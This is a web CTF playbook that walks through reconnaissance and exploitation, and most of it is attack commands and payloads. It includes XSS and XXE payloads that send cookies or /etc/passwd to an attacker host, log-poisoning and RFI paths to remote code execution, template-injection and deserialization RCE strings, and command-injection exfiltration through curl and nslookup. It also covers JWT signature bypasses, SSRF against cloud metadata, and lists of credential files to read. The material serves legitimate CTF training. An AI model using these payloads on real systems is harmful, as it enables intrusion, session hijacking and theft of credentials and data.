# 🌐 Web Challenges Playbook

> **Sentinel CTF Framework — Web Category**
> Step-by-step decision tree for solving web CTF challenges.

---

## ⚡ Triage Checklist (First 5 Minutes)

Do these immediately when you open a web challenge:

- [ ] Visit the site — note URL, port, any login pages, forms, or error messages
- [ ] Check `robots.txt` and `sitemap.xml`
- [ ] View page source (`Ctrl+U`) — look for comments, hidden fields, JS files, API endpoints
- [ ] Open Browser DevTools → Network tab, reload, inspect all requests
- [ ] Check cookies (names, values, HttpOnly/Secure flags)
- [ ] Look for version numbers in headers (`X-Powered-By`, `Server`, `X-Generator`)
- [ ] Check for a `/.git/` directory — if present, dump the repo
- [ ] Try obvious credentials: `admin:admin`, `admin:password`, `guest:guest`
- [ ] Read the challenge description carefully — it usually hints at the vulnerability class

---

## 🔍 Phase 1: Reconnaissance

### 1.1 Port & Service Scanning

```bash
# Quick scan
nmap -sV -sC -p- --min-rate 5000 <TARGET_IP>

# If only a web port is known
nmap -sV -sC -p 80,443,8080,8443,8000,3000 <TARGET_IP>

# UDP scan (for DNS, SNMP)
nmap -sU --top-ports 20 <TARGET_IP>

# Output to file
nmap -sV -sC -oN nmap_output.txt <TARGET_IP>
```

### 1.2 Technology Fingerprinting

```bash
# Identify CMS, frameworks, server tech
whatweb http://<TARGET>

# Wappalyzer browser extension (check manually)
# Or use the CLI version:
wappalyzer http://<TARGET>

# Check HTTP headers
curl -sI http://<TARGET>
curl -sI http://<TARGET> | grep -i "server\|x-powered\|x-generator\|content-type"

# Check SSL cert details (may reveal subdomains)
openssl s_client -connect <TARGET>:443 </dev/null 2>/dev/null | openssl x509 -text | grep -E "Subject|DNS"

# nikto web scan
nikto -h http://<TARGET>
```

### 1.3 Git Repository Exposure

```bash
# Check if /.git/ is accessible
curl -s http://<TARGET>/.git/HEAD

# Dump the entire repo
git-dumper http://<TARGET>/.git/ ./dumped_repo

# Then inspect the repo
cd dumped_repo
git log --oneline
git show HEAD
git stash list
git log --all --oneline  # Check all branches
```

---

## 📁 Phase 2: Directory & File Brute Force

### 2.1 ffuf (Recommended)

```bash
# Basic directory brute force
ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302,403

# With extensions
ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt,.bak,.old,.zip,.tar.gz -mc 200,301,302,403

# Recursive
ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 2

# Subdomain fuzzing
ffuf -u http://FUZZ.<TARGET>/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302

# Virtual host fuzzing
ffuf -u http://<TARGET>/ -H "Host: FUZZ.<TARGET>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -fs <default_size>

# Parameter fuzzing (GET)
ffuf -u "http://<TARGET>/page?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Parameter value fuzzing
ffuf -u "http://<TARGET>/page?id=FUZZ" -w /usr/share/seclists/Fuzzing/integers.txt -mc 200

# POST parameter fuzzing
ffuf -u http://<TARGET>/login -X POST -d "username=FUZZ&password=test" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -mc 200
```

### 2.2 gobuster

```bash
# Directory brute force
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak

# DNS subdomain
gobuster dns -d <TARGET_DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Virtual host
gobuster vhost -u http://<TARGET> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### 2.3 feroxbuster (fast, recursive)

```bash
feroxbuster -u http://<TARGET> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -r
```

---

## 🐛 Phase 3: Vulnerability Testing

### 3.1 SQL Injection

#### Quick Detection

```bash
# Manual — add ' to parameters and look for errors
curl "http://<TARGET>/item?id=1'"
curl "http://<TARGET>/item?id=1 OR 1=1--"
curl "http://<TARGET>/item?id=1 AND 1=2--"

# Time-based blind
curl "http://<TARGET>/item?id=1; SELECT SLEEP(5)--"
```

#### SQLMap

```bash
# Basic injection test (GET)
sqlmap -u "http://<TARGET>/item?id=1" --batch

# POST request
sqlmap -u "http://<TARGET>/login" --data="username=admin&password=test" --batch

# From Burp saved request file
sqlmap -r request.txt --batch

# Specify database type
sqlmap -u "http://<TARGET>/item?id=1" --dbms=mysql --batch

# Dump databases
sqlmap -u "http://<TARGET>/item?id=1" --dbs --batch

# Dump tables from a DB
sqlmap -u "http://<TARGET>/item?id=1" -D <dbname> --tables --batch

# Dump a specific table
sqlmap -u "http://<TARGET>/item?id=1" -D <dbname> -T <tablename> --dump --batch

# Authentication (pass cookies)
sqlmap -u "http://<TARGET>/item?id=1" --cookie="session=abc123" --batch

# Try to get shell
sqlmap -u "http://<TARGET>/item?id=1" --os-shell --batch

# Increase level/risk for harder injections
sqlmap -u "http://<TARGET>/item?id=1" --level=5 --risk=3 --batch
```

#### If You See X → Try Y (SQL Injection)

| Observation | Action |
|---|---|
| MySQL error with `'` | SQLMap with `--dbms=mysql` |
| Blind — no error but behavior changes | `--technique=B` (boolean blind) |
| Time delay with `SLEEP(5)` | `--technique=T` (time blind) |
| WAF blocking SQLMap | `--tamper=space2comment,charencode` |
| UNION works | `--technique=U`, try `ORDER BY` to find column count |
| Error-based works | `--technique=E` |

### 3.2 Cross-Site Scripting (XSS)

```bash
# Basic reflected XSS payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)

# Steal cookies (set up listener first with nc or a webhook)
<script>fetch('http://<YOUR_IP>/'+document.cookie)</script>
<script>new Image().src='http://<YOUR_IP>/?c='+btoa(document.cookie)</script>

# XSS hunter for blind XSS
# Use payload from xsshunter.com or self-hosted

# Bypass filters
<ScRiPt>alert(1)</ScRiPt>       # Case variation
<sc<script>ript>alert(1)        # Nested tags
%3Cscript%3Ealert(1)%3C/script%3E  # URL encoding
&#x3C;script&#x3E;alert(1)      # HTML entity encoding
```

#### XSS → Cookie Theft Workflow

```bash
# Start a listener
nc -lvnp 8080
# Or Python HTTP server
python3 -m http.server 8080

# Payload in input
<script>document.location='http://<YOUR_IP>:8080/?c='+document.cookie</script>
```

### 3.3 Insecure Direct Object Reference (IDOR)

```bash
# Change IDs in URLs
curl "http://<TARGET>/api/user/1"
curl "http://<TARGET>/api/user/2"

# Change IDs in POST body
curl -X POST http://<TARGET>/api/profile -d '{"user_id":1}' -H "Content-Type: application/json"

# Brute force IDs with ffuf
ffuf -u "http://<TARGET>/api/user/FUZZ" -w <(seq 1 1000) -mc 200

# Try predictable filenames
curl "http://<TARGET>/download?file=report_001.pdf"
curl "http://<TARGET>/download?file=report_002.pdf"

# Try GUIDs — look for patterns or enumerate
# UUIDs might be sequential or version 1 (time-based)
```

### 3.4 Server-Side Request Forgery (SSRF)

```bash
# Basic SSRF — point URL param to internal resource
curl "http://<TARGET>/fetch?url=http://127.0.0.1/"
curl "http://<TARGET>/fetch?url=http://localhost:22"
curl "http://<TARGET>/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS metadata

# Common internal endpoints to try
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/          # IPv6 localhost
http://localhost/
http://169.254.169.254/latest/meta-data/  # AWS
http://metadata.google.internal/          # GCP
http://169.254.169.254/metadata/v1/       # DigitalOcean

# Bypass SSRF filters
http://0177.0.0.1/          # Octal
http://0x7f000001/          # Hex
http://2130706433/          # Decimal
http://127.1/               # Short form
http://spoofed.domain/      # DNS rebinding

# Protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a  # Redis via gopher

# Use a collaborator/webhook to detect blind SSRF
curl "http://<TARGET>/fetch?url=http://<BURP_COLLABORATOR_URL>"
```

### 3.5 File Inclusion (LFI / RFI)

```bash
# Basic LFI
curl "http://<TARGET>/page?file=../../../etc/passwd"
curl "http://<TARGET>/page?file=....//....//etc/passwd"  # Double dot bypass
curl "http://<TARGET>/page?file=..%2F..%2F..%2Fetc%2Fpasswd"  # URL encoded

# PHP wrappers
curl "http://<TARGET>/page?file=php://filter/convert.base64-encode/resource=index.php"
curl "http://<TARGET>/page?file=php://input" --data "<?php system('id');?>"
curl "http://<TARGET>/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+"

# Log poisoning → RCE via LFI
# 1. Poison access.log with PHP via User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://<TARGET>/
# 2. Include the log
curl "http://<TARGET>/page?file=/var/log/apache2/access.log&cmd=id"

# Common files to read via LFI
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/home/<user>/.ssh/id_rsa
/root/.ssh/id_rsa

# RFI (if allow_url_include is on)
curl "http://<TARGET>/page?file=http://<YOUR_IP>/shell.php"
```

### 3.6 XML External Entity (XXE)

```bash
# Basic XXE payload — send in XML body
# Payload:
cat > xxe.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
EOF

curl -X POST http://<TARGET>/api/upload -d @xxe.xml -H "Content-Type: application/xml"

# Blind XXE (out-of-band)
cat > xxe_oob.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<YOUR_IP>/evil.dtd"> %xxe;]>
<root/>
EOF

# evil.dtd on your server:
cat > evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://<YOUR_IP>/?data=%file;'>">
%wrap;
%send;
EOF

python3 -m http.server 80  # Listen for the callback
```

### 3.7 Deserialization

```bash
# PHP object injection
# Look for base64-encoded serialized objects in cookies/params
# O:8:"stdClass":1:{s:4:"name";s:5:"admin";}

# Java deserialization — use ysoserial
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0
# Send the payload as the serialized object

# Python pickle (if you see pickled data)
python3 -c "import pickle,os,base64; print(base64.b64encode(pickle.dumps(os.system('id'))))"

# Node.js (node-serialize)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(err,out){console.log(out)})}()"}
```

### 3.8 JWT Issues

```bash
# Decode a JWT (no verification)
echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Crack JWT secret with hashcat
hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt

# Tool: jwt_tool
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <JWT> -T           # Tamper
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt  # Crack

# Algorithm confusion: RS256 → HS256
# Get the server's public key, use it as HMAC secret
python3 jwt_tool.py <JWT> -X k -pk public.pem

# None algorithm attack
python3 jwt_tool.py <JWT> -X a         # Try alg:none

# Manual none attack
# Header: {"alg":"none","typ":"JWT"}
# Encode as base64url, remove signature, keep trailing dot
python3 -c "
import base64, json
h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
"
```

### 3.9 Server-Side Template Injection (SSTI)

```bash
# Detection payloads — try in all input fields
{{7*7}}         # Returns 49? → Jinja2/Twig
${7*7}          # Returns 49? → FreeMarker/Velocity
<%= 7*7 %>      # Returns 49? → ERB (Ruby)
#{7*7}          # Returns 49? → Ruby
*{7*7}          # Returns 49? → Thymeleaf

# Jinja2 (Python Flask) RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Twig (PHP) RCE
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FreeMarker (Java) RCE
${"freemarker.template.utility.Execute"?new()("id")}
```

### 3.10 Command Injection

```bash
# Test payloads — inject into input fields
; id
| id
&& id
` id`
$(id)
%0Aid        # URL-encoded newline

# Blind command injection (use time delay or OOB)
; sleep 5
| sleep 5

# Exfiltrate via DNS (OOB)
; nslookup `id`.YOUR_BURP_COLLABORATOR.com
; curl http://<YOUR_IP>/$(id)

# Bypass filters
# Space bypasses
{id}
$IFS
{id,$IFS}

# Semicolon bypass
%0a id  # Newline
%0d%0a id

# Filter bypass with encoding
$(printf "\x69\x64")   # id in hex
```

---

## 🔐 Phase 4: Authentication Bypass

```bash
# SQL injection in login
username: admin'--
username: ' OR 1=1--
username: admin'/*

# Default credentials
admin:admin | admin:password | admin:123456
root:root | root:toor | test:test
# Check: https://default-password.info/

# Mass assignment (add role/isAdmin to POST body)
curl -X POST http://<TARGET>/register -d '{"username":"hacker","password":"pass","isAdmin":true}' -H "Content-Type: application/json"

# Password reset flaws
# 1. Try changing the email in the reset request to your email
# 2. Check if the reset token is predictable (timestamp-based, sequential)
# 3. Host header injection in reset email

# Cookie manipulation
# Decode base64 cookies and modify values
echo "dXNlcjoxMjM=" | base64 -d    # user:123
echo -n "admin:999" | base64        # Modify and re-encode

# JWT admin escalation — see JWT section above
```

---

## 🔌 Phase 5: API Testing

```bash
# Discover API endpoints
# Check /api/v1/, /api/v2/, /swagger.json, /openapi.json, /api-docs

curl http://<TARGET>/api/v1/
ffuf -u http://<TARGET>/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc 200,201,400,401,403

# Test all HTTP methods
curl -X GET http://<TARGET>/api/user/1
curl -X POST http://<TARGET>/api/user/1
curl -X PUT http://<TARGET>/api/user/1 -d '{"role":"admin"}' -H "Content-Type: application/json"
curl -X DELETE http://<TARGET>/api/user/1
curl -X PATCH http://<TARGET>/api/user/1 -d '{"role":"admin"}' -H "Content-Type: application/json"

# Check for missing auth on sensitive endpoints
curl http://<TARGET>/api/admin/users
curl http://<TARGET>/api/admin/settings

# GraphQL introspection
curl -X POST http://<TARGET>/graphql -d '{"query":"{__schema{types{name}}}"}' -H "Content-Type: application/json"
# Full introspection
curl -X POST http://<TARGET>/graphql -d '{"query":"{ __schema { queryType { name } types { name kind fields { name type { name kind ofType { name kind } } } } } }"}' -H "Content-Type: application/json"
```

---

## 📋 Master If-You-See-X → Try-Y Table

| You See | Try |
|---|---|
| `?id=1` in URL | SQL injection, IDOR |
| Login form | SQLi auth bypass, brute force, default creds |
| File upload | Upload PHP shell, IDOR on the download URL |
| `?page=` or `?file=` | LFI/RFI |
| `?url=` or `?fetch=` | SSRF |
| XML/SOAP body | XXE |
| Template-rendered input | SSTI |
| JWT cookie | Algorithm confusion, none attack, secret cracking |
| Error messages with stack traces | Leak tech stack, version info |
| `/.git/` accessible | git-dumper |
| `robots.txt` with hidden paths | Visit all disallowed paths |
| Admin panel 403 | Path traversal (`/admin/./`), header spoofing (`X-Forwarded-For: 127.0.0.1`) |
| Serialized cookie (base64 `O:`) | PHP object injection |
| `?redirect=` or `?next=` | Open redirect, SSRF |
| GraphQL endpoint | Introspection, field injection |
| `X-Forwarded-For` header | Bypass IP restrictions |

---

## ⚠️ Common Mistakes to Avoid

1. **Not checking the source code** — always `Ctrl+U` first
2. **Forgetting to fuzz extensions** — `.bak`, `.old`, `.zip`, `.php~` often exist
3. **Using only GET** — test POST, PUT, PATCH, DELETE on every endpoint
4. **Ignoring error messages** — they reveal technology stack and paths
5. **Not testing for race conditions** — try parallel requests on critical endpoints
6. **Skipping the `robots.txt` and `sitemap.xml`** — frequently exposes hidden paths
7. **Missing `Host:` header injection** — for SSRF and password reset abuse
8. **Not trying to change `Content-Type`** — `application/json` ↔ `application/xml` can unlock XXE
9. **Forgetting case sensitivity** — `ADMIN`, `Admin`, `/Admin/` may bypass filters
10. **Not checking response size differences** — even a 1-byte difference signals a blind vuln

---

## 🛠️ Tool Quick Reference

| Tool | Purpose | Install |
|---|---|---|
| `ffuf` | Fast fuzzer | `apt install ffuf` |
| `gobuster` | Dir/DNS/vhost brute force | `apt install gobuster` |
| `sqlmap` | SQL injection automation | `apt install sqlmap` |
| `nikto` | Web server scanner | `apt install nikto` |
| `whatweb` | Tech fingerprinting | `apt install whatweb` |
| `git-dumper` | Dump exposed git repos | `pip install git-dumper` |
| `jwt_tool` | JWT analysis/attack | GitHub |
| `wfuzz` | Web fuzzer (alternative to ffuf) | `apt install wfuzz` |
| `Burp Suite` | Proxy / manual testing | Built-in Kali |

---

*Sentinel CTF Framework — Web Playbook v1.0*
